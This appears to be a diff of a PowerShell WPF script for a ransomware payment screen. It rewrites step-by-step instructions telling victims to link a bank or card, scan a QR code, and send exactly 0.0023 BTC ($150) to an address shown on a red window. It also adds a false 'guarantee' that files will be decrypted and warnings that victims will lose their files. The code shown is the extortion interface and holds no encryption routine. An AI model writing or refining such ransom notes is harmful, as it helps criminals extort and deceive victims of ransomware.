@@ -103,44 +103,44 @@ function Show-BitcoinInstructions {
     $infoSection.Child = $infoText
     $stackPanel.Children.Add($infoSection)
 
-# Assurance section - Blue panel
-$assuranceSection = New-Object System.Windows.Controls.Border
-$assuranceSection.Background = [System.Windows.Media.Brushes]::LightBlue
-$assuranceSection.BorderBrush = [System.Windows.Media.Brushes]::RoyalBlue
-$assuranceSection.BorderThickness = '2,2,2,2'
-$assuranceSection.CornerRadius = '5,5,5,5'
-$assuranceSection.Padding = '15,15,15,15'
-$assuranceSection.Margin = '0,0,0,20'
+    # Assurance section - Blue panel
+    $assuranceSection = New-Object System.Windows.Controls.Border
+    $assuranceSection.Background = [System.Windows.Media.Brushes]::LightBlue
+    $assuranceSection.BorderBrush = [System.Windows.Media.Brushes]::RoyalBlue
+    $assuranceSection.BorderThickness = '2,2,2,2'
+    $assuranceSection.CornerRadius = '5,5,5,5'
+    $assuranceSection.Padding = '15,15,15,15'
+    $assuranceSection.Margin = '0,0,0,20'
 
-$assuranceGrid = New-Object System.Windows.Controls.Grid
-$col1 = New-Object System.Windows.Controls.ColumnDefinition
-$col1.Width = 'Auto'
-$col2 = New-Object System.Windows.Controls.ColumnDefinition
-$col2.Width = '*'
-$assuranceGrid.ColumnDefinitions.Add($col1)
-$assuranceGrid.ColumnDefinitions.Add($col2)
+    $assuranceGrid = New-Object System.Windows.Controls.Grid
+    $col1 = New-Object System.Windows.Controls.ColumnDefinition
+    $col1.Width = 'Auto'
+    $col2 = New-Object System.Windows.Controls.ColumnDefinition
+    $col2.Width = '*'
+    $assuranceGrid.ColumnDefinitions.Add($col1)
+    $assuranceGrid.ColumnDefinitions.Add($col2)
 
-# Assurance icon
-$assuranceIcon = New-Object System.Windows.Controls.TextBlock
-$assuranceIcon.Text = "✅"
-$assuranceIcon.FontSize = 24
-$assuranceIcon.Margin = '0,0,10,0'
-$assuranceIcon.VerticalAlignment = 'Top'
-[System.Windows.Controls.Grid]::SetColumn($assuranceIcon, 0)
+    # Assurance icon
+    $assuranceIcon = New-Object System.Windows.Controls.TextBlock
+    $assuranceIcon.Text = "✅"
+    $assuranceIcon.FontSize = 24
+    $assuranceIcon.Margin = '0,0,10,0'
+    $assuranceIcon.VerticalAlignment = 'Top'
+    [System.Windows.Controls.Grid]::SetColumn($assuranceIcon, 0)
 
-# Assurance text
-$assuranceText = New-Object System.Windows.Controls.TextBlock
-$assuranceText.Text = "GUARANTEE: Once Bitcoin payment is received and confirmed, your files will be automatically decrypted and full system access will be restored immediately. We have a 100% track record of restoring access for users who pay the ransom."
-$assuranceText.FontSize = 12
-$assuranceText.FontWeight = [System.Windows.FontWeights]::Bold
-$assuranceText.TextWrapping = 'Wrap'
-$assuranceText.Foreground = [System.Windows.Media.Brushes]::DarkBlue
-[System.Windows.Controls.Grid]::SetColumn($assuranceText, 1)
+    # Assurance text
+    $assuranceText = New-Object System.Windows.Controls.TextBlock
+    $assuranceText.Text = "GUARANTEE: Once Bitcoin payment is received and confirmed, your files will be automatically decrypted and full system access will be restored immediately. We have a 100% track record of restoring access for users who pay the ransom."
+    $assuranceText.FontSize = 12
+    $assuranceText.FontWeight = [System.Windows.FontWeights]::Bold
+    $assuranceText.TextWrapping = 'Wrap'
+    $assuranceText.Foreground = [System.Windows.Media.Brushes]::DarkBlue
+    [System.Windows.Controls.Grid]::SetColumn($assuranceText, 1)
 
-$assuranceGrid.Children.Add($assuranceIcon)
-$assuranceGrid.Children.Add($assuranceText)
-$assuranceSection.Child = $assuranceGrid
-$stackPanel.Children.Add($assuranceSection)
+    $assuranceGrid.Children.Add($assuranceIcon)
+    $assuranceGrid.Children.Add($assuranceText)
+    $assuranceSection.Child = $assuranceGrid
+    $stackPanel.Children.Add($assuranceSection)
     
     # What You Need section
     $needsHeader = New-Object System.Windows.Controls.TextBlock
@@ -239,9 +239,9 @@ $stackPanel.Children.Add($assuranceSection)
     $step3Content.Margin = '0,0,0,20'
     $stackPanel.Children.Add($step3Content)
     
-    # Step 4
+    # Step 4: Link Bank
     $step4Header = New-Object System.Windows.Controls.TextBlock
-    $step4Header.Text = "STEP 4: Buying Bitcoin"
+    $step4Header.Text = "STEP 4: Link Bank"
     $step4Header.FontSize = 16
     $step4Header.FontWeight = [System.Windows.FontWeights]::Bold
     $step4Header.Margin = '0,0,0,10'
@@ -251,77 +251,37 @@ $stackPanel.Children.Add($assuranceSection)
     $step4List.Margin = '20,0,0,20'
     
     $step4Item1 = New-Object System.Windows.Controls.TextBlock
-    $step4Item1.Text = "• Once your account is set up, click 'Buy & Sell'"
+    $step4Item1.Text = "• Once your account is set up, click the menu button in the top left"
     $step4Item1.FontSize = 12
     $step4Item1.Margin = '0,0,0,3'
     
     $step4Item2 = New-Object System.Windows.Controls.TextBlock
-    $step4Item2.Text = "• Select Bitcoin (BTC)"
+    $step4Item2.Text = "• Select your name"
     $step4Item2.FontSize = 12
     $step4Item2.Margin = '0,0,0,3'
     
     $step4Item3 = New-Object System.Windows.Controls.TextBlock
-    $step4Item3.Text = "• Click the '0 BTC' icon under the amount field to switch to BTC (not your local currency)"
+    $step4Item3.Text = "• Select 'Payment Method'"
     $step4Item3.FontSize = 12
     $step4Item3.Margin = '0,0,0,3'
     
     $step4Item4 = New-Object System.Windows.Controls.TextBlock
-    $step4Item4.Text = "• ENTER EXACT AMOUNT: 0.0022 BTC"
+    $step4Item4.Text = "• IMPORTANT: You must choose between credit/debit or link your bank account. Any other payment method will hold your transfer for several days, and you will lose access to your files!"
     $step4Item4.FontSize = 12
     $step4Item4.FontWeight = [System.Windows.FontWeights]::Bold
     $step4Item4.Foreground = [System.Windows.Media.Brushes]::DarkRed
     $step4Item4.Margin = '0,0,0,3'
-    
-    $step4Item5 = New-Object System.Windows.Controls.TextBlock
-    $step4Item5.Text = "• Click 'Continue to payment'"
-    $step4Item5.FontSize = 12
-    $step4Item5.Margin = '0,0,0,3'
-    
-    $step4Item6 = New-Object System.Windows.Controls.TextBlock
-    $step4Item6.Text = "• Select your payment method (credit/debit card or bank transfer)"
-    $step4Item6.FontSize = 12
-    $step4Item6.Margin = '0,0,0,3'
-    
-    $step4Item7 = New-Object System.Windows.Controls.TextBlock
-    $step4Item7.Text = "• Click 'Review order' (double-check the amount is correct)"
-    $step4Item7.FontSize = 12
-    $step4Item7.Margin = '0,0,0,3'
-    
-    $step4Item8 = New-Object System.Windows.Controls.TextBlock
-    $step4Item8.Text = "• Click 'Buy Now'"
-    $step4Item8.FontSize = 12
-    $step4Item8.Margin = '0,0,0,3'
+    $step4Item4.TextWrapping = 'Wrap'
     
     $step4List.Children.Add($step4Item1)
     $step4List.Children.Add($step4Item2)
     $step4List.Children.Add($step4Item3)
     $step4List.Children.Add($step4Item4)
-    $step4List.Children.Add($step4Item5)
-    $step4List.Children.Add($step4Item6)
-    $step4List.Children.Add($step4Item7)
-    $step4List.Children.Add($step4Item8)
     $stackPanel.Children.Add($step4List)
     
-    # Note
-    $noteSection = New-Object System.Windows.Controls.Border
-    $noteSection.Background = [System.Windows.Media.Brushes]::LightCyan
-    $noteSection.BorderBrush = [System.Windows.Media.Brushes]::DarkCyan
-    $noteSection.BorderThickness = '1,1,1,1'
-    $noteSection.CornerRadius = '5,5,5,5'
-    $noteSection.Padding = '10,10,10,10'
-    $noteSection.Margin = '0,0,0,20'
-    
-    $noteText = New-Object System.Windows.Controls.TextBlock
-    $noteText.Text = "NOTE: Funds may take more than a day to appear in your account. Check your Coinbase account regularly until the Bitcoin appears."
-    $noteText.FontSize = 11
-    $noteText.FontStyle = 'Italic'
-    $noteText.TextWrapping = 'Wrap'
-    $noteSection.Child = $noteText
-    $stackPanel.Children.Add($noteSection)
-    
-    # Step 5
+    # Step 4 (should be Step 5): Sending Bitcoin
     $step5Header = New-Object System.Windows.Controls.TextBlock
-    $step5Header.Text = "STEP 5: Send Bitcoin"
+    $step5Header.Text = "STEP 4: Sending Bitcoin"
     $step5Header.FontSize = 16
     $step5Header.FontWeight = [System.Windows.FontWeights]::Bold
     $step5Header.Margin = '0,0,0,10'
@@ -331,35 +291,85 @@ $stackPanel.Children.Add($assuranceSection)
     $step5List.Margin = '20,0,0,20'
     
     $step5Item1 = New-Object System.Windows.Controls.TextBlock
-    $step5Item1.Text = "• Once your funds are available, open the Coinbase app"
+    $step5Item1.Text = "• Once you have added a payment method, navigate to the 'Pay' page and select the square QR code icon in the top right"
     $step5Item1.FontSize = 12
     $step5Item1.Margin = '0,0,0,3'
     
     $step5Item2 = New-Object System.Windows.Controls.TextBlock
-    $step5Item2.Text = "• Navigate to the 'Pay' page and select the square QR code icon in the top right"
+    $step5Item2.Text = "• Scan the QR code displayed in the red window on your computer screen (if your screen turns black restart the app, return to pay page and skip this step)"
     $step5Item2.FontSize = 12
     $step5Item2.Margin = '0,0,0,3'
+    $step5Item2.TextWrapping = 'Wrap'
     
     $step5Item3 = New-Object System.Windows.Controls.TextBlock
-    $step5Item3.Text = "• Scan the QR code displayed in the red window on your computer screen"
+    $step5Item3.Text = "• Make sure you Select Bitcoin (BTC)"
     $step5Item3.FontSize = 12
     $step5Item3.Margin = '0,0,0,3'
     
     $step5Item4 = New-Object System.Windows.Controls.TextBlock
-    $step5Item4.Text = "• Confirm you are sending the exact amount: 0.0022 BTC"
+    $step5Item4.Text = "• Click the '0 BTC' icon under the amount field to switch to BTC (not your local currency)"
     $step5Item4.FontSize = 12
     $step5Item4.Margin = '0,0,0,3'
     
     $step5Item5 = New-Object System.Windows.Controls.TextBlock
-    $step5Item5.Text = "• Send the Bitcoin"
+    $step5Item5.Text = "• The amount field should say '0 BTC'. If it does not say BTC, you did it wrong."
     $step5Item5.FontSize = 12
     $step5Item5.Margin = '0,0,0,3'
+    $step5Item5.FontStyle = 'Italic'
+    
+    $step5Item6 = New-Object System.Windows.Controls.TextBlock
+    $step5Item6.Text = "• ENTER EXACT AMOUNT: 0.0023 BTC"
+    $step5Item6.FontSize = 12
+    $step5Item6.FontWeight = [System.Windows.FontWeights]::Bold
+    $step5Item6.Foreground = [System.Windows.Media.Brushes]::DarkRed
+    $step5Item6.Margin = '0,0,0,3'
+    
+    $step5Item7 = New-Object System.Windows.Controls.TextBlock
+    $step5Item7.Text = "• Click 'Pay'"
+    $step5Item7.FontSize = 12
+    $step5Item7.Margin = '0,0,0,3'
+    
+    $step5Item8 = New-Object System.Windows.Controls.TextBlock
+    $step5Item8.Text = "• If QR code didn't work, manually enter the bitcoin address displayed on the red screen on your computer."
+    $step5Item8.FontSize = 12
+    $step5Item8.Margin = '0,0,0,3'
+    $step5Item8.TextWrapping = 'Wrap'
+    
+    $step5Item9 = New-Object System.Windows.Controls.TextBlock
+    $step5Item9.Text = "• IMPORTANT: ENSURE YOU ENTER THE ADDRESS EXACTLY AS DISPLAYED ON RED WINDOW - if any character is wrong, payment will not be received."
+    $step5Item9.FontSize = 12
+    $step5Item9.FontWeight = [System.Windows.FontWeights]::Bold
+    $step5Item9.Foreground = [System.Windows.Media.Brushes]::DarkRed
+    $step5Item9.Margin = '0,0,0,3'
+    $step5Item9.TextWrapping = 'Wrap'
+    
+    $step5Item10 = New-Object System.Windows.Controls.TextBlock
+    $step5Item10.Text = "• A single result should show up once you are done typing out address. Select it."
+    $step5Item10.FontSize = 12
+    $step5Item10.Margin = '0,0,0,3'
+    
+    $step5Item11 = New-Object System.Windows.Controls.TextBlock
+    $step5Item11.Text = "• If asked between Self-custody wallet or Exchange, select 'Self-custody'."
+    $step5Item11.FontSize = 12
+    $step5Item11.Margin = '0,0,0,3'
+    
+    $step5Item12 = New-Object System.Windows.Controls.TextBlock
+    $step5Item12.Text = "• Select Pay Now."
+    $step5Item12.FontSize = 12
+    $step5Item12.Margin = '0,0,0,3'
     
     $step5List.Children.Add($step5Item1)
     $step5List.Children.Add($step5Item2)
     $step5List.Children.Add($step5Item3)
     $step5List.Children.Add($step5Item4)
     $step5List.Children.Add($step5Item5)
+    $step5List.Children.Add($step5Item6)
+    $step5List.Children.Add($step5Item7)
+    $step5List.Children.Add($step5Item8)
+    $step5List.Children.Add($step5Item9)
+    $step5List.Children.Add($step5Item10)
+    $step5List.Children.Add($step5Item11)
+    $step5List.Children.Add($step5Item12)
     $stackPanel.Children.Add($step5List)
     
     # Final Warning
@@ -689,7 +699,7 @@ $paymentTitle.Margin = '0,0,0,10'
 
 # Amount Display
 $amountDisplay = New-Object System.Windows.Controls.TextBlock
-$amountDisplay.Text = "`$150 USD (0.0022 BTC)"
+$amountDisplay.Text = "`$150 USD (0.0023 BTC)"
 $amountDisplay.Foreground = [System.Windows.Media.Brushes]::White
 $amountDisplay.Background = [System.Windows.Media.Brushes]::DarkRed
 $amountDisplay.FontFamily = 'Segoe UI'
